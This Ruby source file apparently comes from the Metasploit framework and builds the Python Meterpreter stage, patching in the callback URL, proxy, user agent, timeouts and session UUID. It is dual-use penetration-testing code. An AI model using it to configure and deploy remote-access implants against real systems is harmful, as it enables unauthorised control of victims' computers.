# -*- coding: binary -*-

require 'msf/core'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader

  include Msf::Payload::Python
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options([
      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
    ], self.class)
  end

  def stage_payload(opts={})
    stage_meterpreter(opts)
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  #
  # @param opts [Hash] The options to use for patching the stage data.
  # @option opts [String] :http_proxy_host The host to use as a proxy for
  #   HTTP(S) transports.
  # @option opts [String] :http_proxy_port The port to use when a proxy  host is
  #   set for HTTP(S) transports.
  # @option opts [String] :url The HTTP(S) URL to patch in to
  #   allow use of the stage as a stageless payload.
  # @option opts [String] :http_user_agent The value to use for the User-Agent
  #   header for HTTP(S) transports.
  # @option opts [String] :stageless_tcp_socket_setup Python code to execute to
  #   setup a tcp socket to allow use of the stage as a stageless payload.
  # @option opts [String] :uuid A specific UUID to use for sessions created by
  #   this stage.
  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
    }

    if ds['PythonMeterpreterDebug']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

    http_user_agent = opts[:http_user_agent] || ds['MeterpreterUserAgent']
    http_proxy_host = opts[:http_proxy_host] || ds['PayloadProxyHost'] || ds['PROXYHOST']
    http_proxy_port = opts[:http_proxy_port] || ds['PayloadProxyPort'] || ds['PROXYPORT']

    # patch in the stageless http(s) connection url
    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(opts[:url])}'") if opts[:url].to_s != ''
    met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''

    if http_proxy_host.to_s != ''
      proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
      met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
    end

    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "\t\t#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("\t\t# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

end

end
